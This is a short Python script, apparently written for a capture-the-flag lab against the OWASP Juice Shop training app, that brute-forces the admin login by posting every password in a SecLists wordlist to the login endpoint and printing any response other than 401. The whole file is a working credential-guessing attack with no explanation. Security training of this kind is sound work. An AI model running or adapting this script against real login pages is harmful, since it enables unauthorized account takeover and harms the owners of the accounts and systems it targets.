#
# No paid version of Burp so I manually brute force the admin login
#

import requests

url = "http://10.10.131.230/rest/user/login"

wordlist = open("/usr/share/seclists/Passwords/Common-Credentials/best1050.txt")
l = wordlist.readline().rstrip('\n')
i = 1

while(l != ""):
    data = {"email":"admin@juice-sh.op","password":l}
    # print(data)
    r = requests.post(url, data)
    if(r.status_code != 401):
        print(r.status_code, l)

    i += 1
    try:
        l = wordlist.readline().rstrip('\n')
    except:
        print("Erreur ligne", i)

wordlist.close()

